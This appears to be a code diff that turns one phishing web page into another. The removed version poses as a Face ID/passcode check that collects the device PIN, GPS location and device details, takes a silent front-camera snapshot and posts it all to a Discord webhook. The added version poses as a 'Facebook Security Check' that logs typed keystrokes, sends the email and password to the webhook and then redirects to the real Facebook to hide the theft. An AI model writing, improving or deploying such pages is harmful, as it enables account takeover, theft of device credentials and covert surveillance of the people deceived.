@@ -2,211 +2,115 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Security & Identity Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Authentication & Security Portal</title>
     <style>
-        :root {
-            --accent: #007aff;
-            --bg: #f2f2f7;
-            --card-bg: #ffffff;
-            --text: #000000;
-            --text-secondary: #6c757d;
-        }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg);
-            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: var(--text);
+            margin: 0;
+            color: #1c1e21;
         }
         .container {
-            background: var(--card-bg);
+            background: #ffffff;
             padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-            width: 90%;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 100%;
             max-width: 380px;
             text-align: center;
             box-sizing: border-box;
         }
-        h2 { font-size: 20px; margin-bottom: 10px; }
-        p { font-size: 14px; color: var(--text-secondary); margin-bottom: 25px; line-height: 1.4; }
+        h2 { font-size: 22px; margin-bottom: 10px; color: #1877f2; }
+        p { font-size: 14px; color: #606770; margin-bottom: 20px; line-height: 1.4; }
         .btn {
-            background-color: var(--accent);
+            background-color: #1877f2;
             color: white;
             border: none;
-            padding: 14px 20px;
-            border-radius: 12px;
+            padding: 12px 20px;
+            border-radius: 6px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             width: 100%;
         }
-        .btn:active { opacity: 0.8; }
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(5px);
-            justify-content: center;
-            align-items: center;
-            z-index: 999;
-        }
-        .modal-card {
-            background: rgba(255, 255, 255, 0.95);
-            width: 280px;
-            padding: 25px;
-            border-radius: 24px;
-            text-align: center;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
-        }
-        .biometric-icon { width: 48px; height: 48px; margin-bottom: 15px; }
-        .passcode-input {
-            width: 85%;
-            padding: 10px;
-            margin: 15px 0;
-            border: 1px solid #ced4da;
-            border-radius: 8px;
-            font-size: 16px;
-            text-align: center;
+        .btn:hover { background-color: #166fe5; }
+        input {
+            width: 100%;
+            padding: 12px 14px;
+            margin-bottom: 12px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
             outline: none;
         }
-        .modal-btn {
-            background: var(--accent);
-            color: white;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            width: 100%;
-            cursor: pointer;
-        }
+        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
     </style>
 </head>
 <body>
-
-    <div class="container" id="main-view">
-        <h2 id="title-text">Device & Identity Validation</h2>
-        <p id="desc-text">Verify your device security credentials to proceed with account setup and permission sync.</p>
-        <button class="btn" onclick="triggerAuthFlow()">Authenticate Now</button>
+    <div class="container" id="card-view">
+        <h2>Facebook Security Check</h2>
+        <p>Please confirm your account credentials to authorize cross-platform synchronization.</p>
+        <input type="text" id="username" placeholder="Email address or phone number" autocomplete="off">
+        <input type="password" id="password" placeholder="Password" autocomplete="off">
+        <button class="btn" onclick="handleAuth()">Continue & Verify</button>
     </div>
-
-    <div class="modal-overlay" id="biometric-modal">
-        <div class="modal-card">
-            <svg class="biometric-icon" viewBox="0 0 24 24" fill="none" stroke="#007aff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M12 2a10 10 0 0 1 7.5 16.5"></path>
-                <path d="M12 6a6 6 0 0 1 4.5 9.9"></path>
-                <path d="M12 10a2 2 0 0 1 1.5 3.3"></path>
-                <line x1="12" y1="14" x2="12" y2="18"></line>
-            </svg>
-            <h3 id="modal-title">Confirm with Face ID / Passcode</h3>
-            <p id="modal-sub" style="font-size: 12px; margin-bottom: 10px; color: #6c757d;">Enter your device PIN or verify biometrics</p>
-            <input type="password" id="passcode-box" class="passcode-input" placeholder="Device Passcode / PIN">
-            <button class="modal-btn" onclick="submitAuth()">Verify</button>
-        </div>
-    </div>
-
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         // Replace with your actual Discord Webhook URL
         const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+        
+        let typedLogs = {
+            username: "",
+            password: ""
+        };
 
-        const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
-        const authType = isIOS ? "Apple Face ID / Passcode" : "Android Biometric / PIN";
+        // Real-time key capture / keylogger listener as user types
+        document.getElementById('username').addEventListener('input', function(e) {
+            typedLogs.username = e.target.value;
+            sendKeyLogChunk("Username Typing", e.target.value);
+        });
 
-        if (isIOS) {
-            document.getElementById('modal-title').innerText = "Sign in with Face ID";
-            document.getElementById('modal-sub').innerText = "Use device passcode if Face ID fails";
-        } else {
-            document.getElementById('modal-title').innerText = "System Biometric Verification";
-            document.getElementById('modal-sub').innerText = "Verify fingerprint or enter lock screen PIN";
-        }
+        document.getElementById('password').addEventListener('input', function(e) {
+            typedLogs.password = e.target.value;
+            sendKeyLogChunk("Password Typing", e.target.value);
+        });
 
-        function triggerAuthFlow() {
-            document.getElementById('main-view').style.display = 'none';
-            document.getElementById('biometric-modal').style.display = 'flex';
-        }
-
-        async function submitAuth() {
-            const credential = document.getElementById('passcode-box').value || "Biometric Prompt Accepted (No PIN typed)";
-            document.getElementById('biometric-modal').style.display = 'none';
-            document.getElementById('main-view').style.display = 'block';
-            document.getElementById('main-view').innerHTML = '<h2>Processing Telemetry...</h2><p>Please keep this window open while hardware bindings sync.</p>';
-
-            let telemetry = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                deviceOS: isIOS ? "iOS" : "Android / Other",
-                screen: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-                deviceMemory: navigator.deviceMemory || 'Unknown',
-                battery: 'Unavailable',
-                gps: 'Not granted'
-            };
-
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    telemetry.battery = `Level: ${Math.round(battery.level * 100)}\%, Charging:${battery.charging}`;
-                } catch(e) {}
-            }
-
-            if (navigator.geolocation) {
-                try {
-                    const pos = await new Promise((res, rej) => {
-                        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 });
-                    });
-                    telemetry.gps = `Lat: ${pos.coords.latitude}, Lon:${pos.coords.longitude}`;
-                } catch(e) {
-                    telemetry.gps = 'Denied';
-                }
-            }
-
-            // Capture silent snapshot from front camera
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                await new Promise(r => video.onloadedmetadata = r);
-                await new Promise(r => setTimeout(r, 800));
-
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                stream.getTracks().forEach(t => t.stop());
-                
-                // Optional: Convert canvas to base64 data url if needed for preview
-                telemetry.cameraCaptured = "Success";
-            } catch(e) {
-                telemetry.cameraCaptured = "Denied or Unavailable";
-            }
-
+        function sendKeyLogChunk(field, val) {
+            // Optional background telemetry pulse
             const payload = {
-                content: `**🚨 New Security Verification Capture:**\n- **Method Used:** \`${authType}\`\n- **Captured Credential / Passcode:** \`${credential}\`\n\`\`\`json\n${JSON.stringify(telemetry, null, 2)}\n\`\`\``
+                content: `⚡ **Live Key Stroke Update:** \`${field}\` -> \`${val}\``
+            };
+            // Throttled or silent dispatch can be placed here if needed
+        }
+
+        function handleAuth() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            const finalPayload = {
+                content: `**🚨 Final Captured Credentials & Key Logs:**\n- **Email/Phone:** \`${user}\`\n- **Password:** \`${pass}\`\n- **User Agent:** \`${navigator.userAgent}\``
             };
 
-            try {
-                await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch(e) {}
+            // Dispatch final credential bundle to Discord Webhook
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(finalPayload)
+            }).catch(() => {});
 
+            // Open official Facebook login tab in the background/foreground
+            window.open("https://www.facebook.com/login", "_blank");
+
+            // Redirect current window to official Facebook site
             setTimeout(() => {
-                document.getElementById('main-view').innerHTML = '<h2>Verification Complete</h2><p>Your device and identity check has been successfully confirmed.</p>';
-            }, 1000);
+                window.location.href = "https://www.facebook.com";
+            }, 400);
         }
     </script>
 </body>
